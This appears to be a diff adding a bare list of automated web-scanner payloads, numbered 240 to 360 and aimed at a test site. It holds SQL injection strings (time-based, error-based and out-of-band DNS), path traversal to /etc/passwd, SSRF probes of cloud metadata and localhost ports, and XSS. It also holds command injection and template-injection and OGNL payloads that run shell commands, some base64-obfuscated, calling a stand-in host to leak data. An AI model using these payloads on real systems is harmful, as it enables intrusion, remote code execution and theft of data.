+    240 -1%27+and+6%3d3+or+1%3d1%2b(SELECT+1+and+ROW(1%2c1)%3e(SELECT+COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.COLLATIONS+GROUP+BY+x)a)%2b%27 
+    241 .....///.....///.....///.....///.....///.....///.....///.....///.....///.....///.....///etc/passwd 
+    242 http://169.254.169.254/latest/meta-data/public-hostname 
+    243 syscolumns WHERE 2>3;exec('xp_dirtree ''\\zqvil4-pt7mn1_gl7hjsqq5fm85xq6_usakebqzx'+'9sy.ABCtor.com'+'\c$\a''')-- 
+    244 "+gethostbyname(trim('zqvil4-pt7l0hbybcn2vhiqe76lsjpxmxnz39uau'.'x54.ABCtor.com'))+" 
+    245 DECLARE @q varchar(999),@r nvarchar(999)SET @q = 'SELECT * FROM OPENROWSET(''SQLOLEDB'',''@'';''a'';''1'',''SELECT 1'')'SET @r=replace(@q,'@','zqvil4-pt7xjacv5a4q24epwet-qdvatby4upbkp'+'gr8.ABCtor.com')exec sp_executesql @r 
+    246 http://127.0.0.1:22 
+    247 1;DECLARE @q varchar(999),@r nvarchar(999)SET @q = 'SELECT * FROM OPENROWSET(''SQLOLEDB'',''@'';''a'';''1'',''SELECT 1'')'SET @r=replace(@q,'@','zqvil4-pt7w8fgs4kyuops5ttd5bh6ef1fb6pkzc'+'ffa.ABCtor.com')exec sp_executesql @r-- 
+    248 http://176.28.50.165:22 
+    249 http://::1:22 
+    250 http://127.0.0.1:3306 
+    251  ABCtor(0x000051)  
+    252 . . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /etc/passwd 
+    253 <? gethostbyname(trim('zqvil4-pt7yoz0njtznczk6lx_gxyrgqbhst9is1'.'i70.ABCtor.com'));//?> 
+    254 '{${gethostbyname(trim('zqvil4-pt7rlcqqh_6fu5zb4qoqi4kc8unxeompy'.'c80.ABCtor.com'))}}' 
+    255 16777343/trace.axd 
+    256 
+    ABCtor(0x000086); 
+    257 query/../../../../../../../../../../../etc/passwd 
+    258 http://176.28.50.165:3306 
+    259 http://::1:3306 
+    260 /etc/passwd 
+    261 000260.0034.000062.00000245/trace.axd 
+    262 &#39;+ABCtor(0x000088)+&#39; 
+    263 %2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd 
+    264 data:;base64,TlM3NzU0NTYxNDQ2NTc1 
+    265 search.php 
+    266 -1';DECLARE @q varchar(999),@r nvarchar(999)SET @q = 'SELECT * FROM OPENROWSET(''SQLOLEDB'',''@'';''a'';''1'',''SELECT 1'')'SET @r=replace(@q,'@','zqvil4-pt7grggawfomdjpzpsvucpemavgixyz08'+'exm.ABCtor.com')exec sp_executesql @r-- 
+    267 createobject("WScript.Shell").exec("nslookup zqvil4-pt71vcfokbaxkihrbsykewyjzun1envlq" & "rjg.ABCtor.com").StdOut.ReadAll 
+    268 http://testphp.vulnweb.com/server-status 
+    269 0260.1847973/trace.axd 
+    270 SELECT dblink_connect('host=zqvil4-pt7dks06rveyngsq0izjisskqybrw1ued'||'am8.ABCtor.com user=a password=a connect_timeout=2') 
+    271 dblink_connect('host=zqvil4-pt7itmawufclejgj_i3-alshkax9oxieg'||'i44.ABCtor.com user=a password=a connect_timeout=2') 
+    272 '"@--></style></scRipt><scRipt>ABCtor(0x0000B4)</scRipt> 
+    273 0260.28.12965/trace.axd 
+    274 search.php. 
+    275 cast((SELECT dblink_connect('host=zqvil4-pt7kpcmyurwle5il_bor0gnp-iq_l8asv'||'l_k.ABCtor.com user=a password=a connect_timeout=2')) as numeric) 
+    276 %22%2bABCtor(0x0000CB)%2b%22 
+    277 0260.28.50.165/trace.axd 
+    278 /search.php 
+    279 +createobject("WScript.Shell").exec("nslookup zqvil4-pt7rw-xqreb72wli5dnhwn9t0ldiucqyo" & "uiw.ABCtor.com").StdOut.ReadAll 
+    280 026007031245/trace.axd 
+    281 cast((SELECT dblink_connect(chr(104)||chr(111)||chr(115)||chr(116)||chr(61)||chr(122)||chr(113)||chr(118)||chr(105)||chr(108)||chr(52)||chr(45)||chr(112)||chr(116)||chr(55)||chr(102)||chr(104)||chr(109)||chr(104)||chr(121)||chr(115)||chr(117)||chr(119)||chr(101)||chr(120)||chr(113)||chr(111)||chr(53)||chr(106)||chr(104)||chr(105)||chr(111)||chr(118)||chr(103)||chr(105)||chr(54)||chr(116)||chr(102)||chr(121)||chr(103)||chr(121)||chr(111)||chr(98)||chr(99)||chr(114)||chr(109)||chr(114)||chr(107)||chr(46)||chr(114)||chr(56)||chr(55)||chr(46)||chr(109)||chr(101)||chr(32)||chr(117)||chr(115)||chr(101)||chr(114)||chr(61)||chr(97)||chr(32)||chr(112)||chr(97)||chr(115)||chr(115)||chr(119)||chr(111)||chr(114)||chr(100)||chr(61)||chr(97)||chr(32)||chr(99)||chr(111)||chr(110)||chr(110)||chr(101)||chr(99)||chr(116)||chr(95)||chr(116)||chr(105)||chr(109)||chr(101)||chr(111)||chr(117)||chr(116)||chr(61)||chr(50))) as numeric) 
+    282 \search.php 
+    283 0xb0.1847973/trace.axd 
+    284 <html xmlns="http://www.w3.org/1999/xhtml"><script>ABCtor(0x0000D2)</script></html> 
+    285 0xb0.28.12965/trace.axd 
+    286 0xb0.28.50.165/trace.axd 
+    287 +createobject("WScript.Shell").exec("nslookup zqvil4-pt7o7w2w2m7vx_2y7kpcesitkxvhtliid" & "0es.ABCtor.com").StdOut.ReadAll+ 
+    288 //ABCtor.com/?0x0000D3 
+    289 WEB-INF/web.xml 
+    290 0xb01c32a5/trace.axd 
+    291 176.1847973/trace.axd 
+    292 /../../../../../../../../../../WEB-INF/web.xml 
+    293 '||(SELECT dblink_connect('host=zqvil4-pt7hp9lmwkp_o7cgz8gky5czujpxh7m1c'||'dhu.ABCtor.com user=a password=a connect_timeout=2'))||' 
+    294 176.28.12965/trace.axd 
+    295 (select UTL_INADDR.GET_HOST_ADDRESS('zqvil4-pt77yq3-990s-deocofqvgj1cefyycwkg'||'w-c.ABCtor.com') from DUAL) 
+    296 <%createobject("WScript.Shell").exec("nslookup zqvil4-pt7iq2-5yvc1it10uhu5nzs4m6c1zp__e" & "ely.ABCtor.com").StdOut.ReadAll%> 
+    297 <a HrEf=JaVaScRiPt:ABCtor(0x0000D9)> 
+    298 "+createobject("WScript.Shell").exec("nslookup zqvil4-pt70qq9pniaw_u_hwl2ilbtb16vpzsas5" & "xuc.ABCtor.com").StdOut.ReadAll+" 
+    299 (length(CTXSYS.DRITHSX.SN(user,(select UTL_INADDR.GET_HOST_ADDRESS('zqvil4-pt7qd95gjzcqpyrjvdlumjw5gqxt-fyvj'||'j0y.ABCtor.com') from DUAL)))) 
+    300 2771524784/trace.axd 
+    301 gethostbyname(lc 'zqvil4-pt7hmjbkt4mllzixyj24qxvozk9eqfbjs'.'fhy.ABCtor.com') 
+    302 '||CTXSYS.DRITHSX.SN(user,(select UTL_INADDR.GET_HOST_ADDRESS('zqvil4-pt7j8p9xk_vaqajrcilsiz0j1ocqsdkjh'||'b5a.ABCtor.com') from DUAL))||' 
+    303 eval('gethostbyname(lc 'zqvil4-pt73eybrysrywyv--ullldtbv1brwgl2u'.'6_0.ABCtor.com')') 
+    304 (select UTL_INADDR.GET_HOST_ADDRESS(chr(122)||chr(113)||chr(118)||chr(105)||chr(108)||chr(52)||chr(45)||chr(112)||chr(116)||chr(55)||chr(111)||chr(109)||chr(53)||chr(50)||chr(121)||chr(115)||chr(108)||chr(110)||chr(56)||chr(56)||chr(112)||chr(55)||chr(98)||chr(122)||chr(114)||chr(109)||chr(110)||chr(106)||chr(113)||chr(48)||chr(108)||chr(111)||chr(99)||chr(110)||chr(104)||chr(108)||chr(45)||chr(121)||chr(114)||chr(105)||chr(107)||chr(106)||chr(52)||chr(46)||chr(114)||chr(56)||chr(55)||chr(46)||chr(109)||chr(101)) from DUAL) 
+    305 (length(CTXSYS.DRITHSX.SN(user,(select UTL_INADDR.GET_HOST_ADDRESS(chr(122)||chr(113)||chr(118)||chr(105)||chr(108)||chr(52)||chr(45)||chr(112)||chr(116)||chr(55)||chr(121)||chr(53)||chr(122)||chr(116)||chr(104)||chr(120)||chr(110)||chr(102)||chr(114)||chr(118)||chr(111)||chr(118)||chr(113)||chr(56)||chr(108)||chr(98)||chr(106)||chr(103)||chr(121)||chr(95)||chr(107)||chr(112)||chr(97)||chr(100)||chr(118)||chr(105)||chr(114)||chr(122)||chr(105)||chr(106)||chr(111)||chr(111)||chr(115)||chr(46)||chr(114)||chr(56)||chr(55)||chr(46)||chr(109)||chr(101)) from DUAL)))) 
+    306 '||CTXSYS.DRITHSX.SN(user,(select UTL_INADDR.GET_HOST_ADDRESS(chr(122)||chr(113)||chr(118)||chr(105)||chr(108)||chr(52)||chr(45)||chr(112)||chr(116)||chr(55)||chr(56)||chr(113)||chr(101)||chr(105)||chr(100)||chr(117)||chr(116)||chr(101)||chr(111)||chr(118)||chr(99)||chr(106)||chr(120)||chr(102)||chr(116)||chr(110)||chr(98)||chr(99)||chr(107)||chr(97)||chr(95)||chr(103)||chr(108)||chr(120)||chr(119)||chr(101)||chr(104)||chr(110)||chr(108)||chr(117)||chr(104)||chr(118)||chr(105)||chr(46)||chr(114)||chr(56)||chr(55)||chr(46)||chr(109)||chr(101)) from DUAL))||' 
+    307 query + ((SELECT 1 FROM (SELECT SLEEP(1))A))/*'XOR(((SELECT 1 FROM (SELECT SLEEP(1))A)))OR'|"XOR(((SELECT 1 FROM (SELECT SLEEP(1))A)))OR"*/ 
+    308 '+gethostbyname(lc 'zqvil4-pt7ahtdaxsj910u56qh2_exgblpr4nfcb'.'oi0.ABCtor.com')+' 
+    309 "+gethostbyname(lc 'zqvil4-pt7kqrj0ud6w9ljgsnmcnvxyqvtlv8ckz'.'rvs.ABCtor.com')+" 
+    310  nslookup zqvil4-pt7ujj2_351mxcx4ostocoolt1h8gvjnf^ogy.ABCtor.com&'\"`0&nslookup zqvil4-pt7ujj2_351mxcx4ostocoolt1h8gvjnf^ogy.ABCtor.com&`' 
+    311 query + ((SELECT 1 FROM (SELECT SLEEP(30))A))/*'XOR(((SELECT 1 FROM (SELECT SLEEP(30))A)))OR'|"XOR(((SELECT 1 FROM (SELECT SLEEP(30))A)))OR"*/ 
+    312 & nslookup zqvil4-pt7vuxxwglwrw0oyh0f-iz0m6c8pvtwqj^svk.ABCtor.com&'\"`0&nslookup zqvil4-pt7vuxxwglwrw0oyh0f-iz0m6c8pvtwqj^svk.ABCtor.com&`' 
+    313 '& nslookup zqvil4-pt7aiouh9pzkcc5kxikn8dxnkbrbxfl-d^dks.ABCtor.com&'\"`0&nslookup zqvil4-pt7aiouh9pzkcc5kxikn8dxnkbrbxfl-d^dks.ABCtor.com&`' 
+    314 "& nslookup zqvil4-pt7dzlehoanu2h_yebpbkft8s-wp6tr3e^ftk.ABCtor.com&'\"`0&nslookup zqvil4-pt7dzlehoanu2h_yebpbkft8s-wp6tr3e^ftk.ABCtor.com&`' 
+    315 nslookup "zqvil4-pt7fxikkwjevofqjjd02xovrdawqw9eot""eo0.ABCtor.com" 
+    316 &nslookup "zqvil4-pt7s0dzwdgcxgz2gjwvrdwhrhdnsgkvmk""h-w.ABCtor.com" 
+    317 '&nslookup "zqvil4-pt7n9i5lxusedkhgi5xtpzh6dbv2-nv13""phk.ABCtor.com" 
+    318 "&nslookup "zqvil4-pt7igbs4m37iebunwhnkysfwn6yx4zhbi""rjg.ABCtor.com" 
+    319 |nslookup${IFS}"zqvil4-pt71iox3ivi1d-otnn9_wswbgldz2hdc-""mwu.ABCtor.com" 
+    320 %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='nslookup `whoami`."zqvil4-pt7k5euulfsjtxpf3_pingmmn-yqe_0fc""ciq.ABCtor.com"').(#p=new java.lang.ProcessBuilder({'/bin/bash','-c',#cmd})).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))} 
+    321 %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='nslookup "zqvil4-pt7adyvink-8wre4uw0dmsun_n64alpde"o_w.ABCtor.com"').(#p=new java.lang.ProcessBuilder({'cmd.exe','/c',#cmd})).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))} 
+    322 ${__import__('os').popen(__import__('base64').urlsafe_b64decode('bnNsb29rdXAgenF2aWw0LXB0N3hhdmZzamlhNWhvMTZrd3pxaHhmcW90emYweXVlcm10dy5yODcubWU=')).read()} 
+    323 {{__import__('os').popen(__import__('base64').urlsafe_b64decode('bnNsb29rdXAgenF2aWw0LXB0N3J2dGljYWZidXN6bzVjenp2ODQ3ZW10ZWtlY2xqNzB6bS5yODcubWU=')).read()}} 
+    324 {% set d = "eval(__import__('base64').urlsafe_b64decode('X19pbXBvcnRfXygnb3MnKS5wb3BlbihfX2ltcG9ydF9fKCdiYXNlNjQnKS51cmxzYWZlX2I2NGRlY29kZSgnYm5Oc2IyOXJkWEFnZW5GMmFXdzBMWEIwTnkxa1kzTnNlWGh0WVhRemJtSm5aR2Q1ZDNRNVozSnFkMmMxWW5aNk5XeHRaeTV5T0RjdWJXVT0nKSkucmVhZCgp'))" %}{% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == 'catch_warnings' %}{% for b in c.__init__.func_globals.values() %} {% if b.__class__ == {}.__class__ %}{% if 'eval' in b.keys() %}{{ b['eval'](d) }}{% endif %}{% endif %}{% endfor %}{% endif %}{% endfor %} 
+    325 ${global.process.mainModule.require('child_process').execSync(Buffer('bnNsb29rdXAgenF2aWw0LXB0N3ZxNm1rMHl0eGE1cm9obGQ4dTBuZHhvYV9pemJqal9nMC5yODcubWU=','base64').toString())} 
+    326 {{= global.process.mainModule.require('child_process').execSync(Buffer('bnNsb29rdXAgenF2aWw0LXB0N2h5eThhejV5NGR0bmIxMm1iN2ZjenIzZmRreHJ0c2owNC5yODcubWU=','base64').toString())}} 
+    327 {{range.constructor("return global.process.mainModule.require('child_process').execSync('nslookup zqvil4-pt7mo4zfmm8of2yjluef-z30wotreump5" + "n08.ABCtor.com')")()}} 
+    328 = global.process.mainModule.require('child_process').execSync(Buffer('bnNsb29rdXAgenF2aWw0LXB0N2t2bGwxcm55YXpobmw1c3o4cGNsX19nMC1wOGR0Z29mby5yODcubWU=','base64').toString()) 
+    329 <%- global.process.mainModule.require('child_process').execSync(Buffer('bnNsb29rdXAgenF2aWw0LXB0N3pfZmloYXY3M2dld3Jmdmt1LXlyb2xjdTVteXZ5eXB0NC5yODcubWU=','base64').toString()) %> 
+    330 {php}Smarty_Resource::parseResourceName(system("nslookup zqvil4-pt7oyjkjdvxspn-d007p6y_jlv-f8vfyu"."z88.ABCtor.com"),'b');{/php} 
+    331 {{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("nslookup zqvil4-pt7ebfra1zaryisrpm0cej7huxthiomxz"~"bb4.ABCtor.com")}} 
+    332 <%= "#{(require'base64';%x(#{Base64.urlsafe_decode64('bnNsb29rdXAgenF2aWw0LXB0N2RkMngwdGw2YnJjMnJmZy13Y3hicXV6ODlmcm9kZW16cS5yODcubWU=')})).to_s}" %> 
+    333 <#assign ex="freemarker.template.utility.Execute"?new()>${ ex("bash -c {eval,$({tr,/+,_-}<<<bnNsb29rdXAgenF2aWw0LXB0N2FubWxmaGdweDNpYWhoMHN3bWpyaDB3aXFnZW1zNXMtNC5yODcubWU=|{base64,--decode})}") } 
+    334 <#assign ex="freemarker.template.utility.Execute"?new()>${ ex("cmd.exe /c nslookup zqvil4-pt7941khot31ucrlb65zkxyzsfaxypx4_"+"f9k.ABCtor.com") } 
+    335 #set($engine="")
+    #set($proc=$engine.getClass().forName("java.lang.Runtime").getRuntime().exec("bash -c {eval,$({tr,/+,_-}<<<bnNsb29rdXAgenF2aWw0LXB0N2t6cG5nc2J1ZnZhODlqbWNzNXAzazdzY2J5YnMxdm02YS5yODcubWU=|{base64,--decode})}"))
+    #set($null=$proc.waitFor())
+    #set($istr=$proc.getInputStream())
+    #set($chr=$engine.getClass().forName("java.lang.Character"))
+    #set($output="")
+    #set($string=$engine.getClass().forName("java.lang.String"))
+    #foreach($i in [1..$istr.available()])
+    #set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))
+    #end
+    ${output} 
+    336 #set($engine="")
+    #set($cmd="cmd.exe /c nslookup zqvil4-pt7gupkzwcmbmfcsibruxkti0tzgjp2ha"+"d2c.ABCtor.com")#set($proc=$engine.getClass().forName("java.lang.Runtime").getRuntime().exec($cmd))
+    #set($null=$proc.waitFor())
+    #set($istr=$proc.getInputStream())
+    #set($chr=$engine.getClass().forName("java.lang.Character"))
+    #set($output="")
+    #set($string=$engine.getClass().forName("java.lang.String"))
+    #foreach($i in [1..$istr.available()])
+    #set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))
+    #end
+    ${output} 
+    337 -1 AND ((SELECT 1 FROM (SELECT 2)a WHERE 1=sleep(25)))-- 1 
+    338 ((select sleep(25)))a-- 1 
+    339 (select dbms_pipe.receive_message((chr(95)||chr(33)||chr(64)||chr(51)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97)),25) from dual) 
+    340 1' || (select dbms_pipe.receive_message((chr(95)||chr(33)||chr(64)||chr(51)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97)),25) from dual) || ' 
+    341 1 + (select dbms_pipe.receive_message((chr(95)||chr(33)||chr(64)||chr(51)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97)),25) from dual) + 1 
+    342 query';SELECT pg_sleep(25)-- 
+    343 query;SELECT pg_sleep(25)-- 
+    344 SELECT pg_sleep(25)-- 
+    345 query);SELECT pg_sleep(25)-- 
+    346 query');SELECT pg_sleep(25)-- 
+    347 query'));SELECT pg_sleep(25)-- 
+    348 query));SELECT pg_sleep(25)-- 
+    349 ((SELECT 1 FROM (SELECT SLEEP(25))A)) 
+    350 '+((SELECT 1 FROM (SELECT SLEEP(25))A))+' 
+    351 '+((SELECT 1 FROM (SELECT SLEEP(1))A))+' 
+    352 '+((SELECT 1 FROM (SELECT SLEEP(30))A))+' 
+    353 -1' or 1=((SELECT 1 FROM (SELECT SLEEP(25))A))+' 
+    354 -1' or 1=((SELECT 1 FROM (SELECT SLEEP(1))A))+' 
+    355 -1' or 1=((SELECT 1 FROM (SELECT SLEEP(30))A))+' 
+    356 -1 or 1=((SELECT 1 FROM (SELECT SLEEP(25))A)) 
+    357 -1" or 1=((SELECT 1 FROM (SELECT SLEEP(25))A))+" 
+    358 query + ((SELECT 1 FROM (SELECT SLEEP(6))A))/*'XOR(((SELECT 1 FROM (SELECT SLEEP(6))A)))OR'|"XOR(((SELECT 1 FROM (SELECT SLEEP(6))A)))OR"*/ 
+    359 query + ((SELECT 1 FROM (SELECT SLEEP(14))A))/*'XOR(((SELECT 1 FROM (SELECT SLEEP(14))A)))OR'|"XOR(((SELECT 1 FROM (SELECT SLEEP(14))A)))OR"*/ 
+    360 query + ((SELECT 1 FROM (SELECT SLEEP(22))A))/*'XOR(((SELECT 1 FROM (SELECT SLEEP(22))A)))OR'|"XOR(((SELECT 1 FROM (SELECT SLEEP(22))A)))OR"*/ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
